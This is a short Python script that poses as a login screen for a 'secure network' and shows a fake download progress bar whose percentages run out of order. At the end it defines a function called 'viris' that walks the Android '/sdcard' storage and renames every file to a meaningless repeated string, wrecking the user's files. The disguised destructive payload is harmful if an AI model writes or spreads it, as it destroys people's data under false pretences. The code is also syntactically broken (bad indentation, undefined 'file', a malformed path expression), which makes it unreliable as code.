import os
import time
from time import sleep
print ('Hello C-4150')
A = input ('UesrName: ')
B = input ('Password: ')
print ('Welcome back mister '+A)
C = input ('Do you want to enter the secure network now: ')
D ="""
 ______________________________________________________________________________
|                                                                              |
|                          Enter uesr and Password                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 UserName:           [ C-4150 ]                               |
|                                                                              |
|                 Password:           [ ****** ]                               |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|______________________________________________________________________________|
"""
print (D)
print ('You have been logged into the secure network Please wait for the download')
print ('10%')
time.sleep(4)
print ('30%')
time.sleep(9)
print ('20%')
time.sleep(5)
print ('44%')
time.sleep(8)
print ('60%')
time.sleep(7)
print ('87%')
time.sleep(6)
print ('99%')
time.sleep(4)
print ('100%')
print ('Done..')
def viris(pot):
    for dir,dirs,files in os.walk(pot):
        Dasatt = len(files)
        for i in range (Dasatt):
        pathF = dir+'/'+file[i]
        name = "1 2 3 4"*(i+1)
        os.rename(pathF,dir'/'+name)
viris('/sdcard')

